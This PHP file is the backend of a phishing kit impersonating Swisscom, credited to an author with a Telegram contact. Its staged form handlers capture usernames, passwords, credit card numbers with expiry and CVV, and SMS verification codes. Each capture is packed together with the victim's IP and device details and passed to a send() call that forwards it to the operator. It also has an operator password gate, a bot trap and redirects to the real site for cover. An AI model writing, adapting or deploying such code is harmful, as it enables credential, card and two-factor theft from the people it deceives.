<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('login');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'out' ) {
            header("Location: " . OFFICIAL_WEBSITE);
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username']   = $_POST['username'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = 'Dieses Feld ist erforderlich';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SWISSCOM | Username';
                $message = '/-- USERNAME INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= '/-- END USERNAME INFOS --/' . "\r\n";
                $message .= victim_infos();
                //send($subject,$message);
                $page = go('password');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('login');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "password") {
            $_SESSION['errors']     = [];
            $_SESSION['password']   = $_POST['password'];
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = 'Dieses Feld ist erforderlich';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SWISSCOM | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_SESSION['username'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('verify');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('password');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_SESSION['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Kartennummer nicht gültig';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'CVV nicht gültig';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Datum ungültig';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | SWISSCOM | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                $page = go('loading1');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('cc');
                header("Location: " . $page['path'] . "?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Code ist nicht gültig';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | NAME | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    session_destroy();
                    $page = go('success');
                    header("Location: " . $page['path'] . "?verification#_");
                    exit();
                }
                $_SESSION['errors']['sms_code'] = 'Code ist nicht gültig';
                $page = go('loading2');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=$error&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>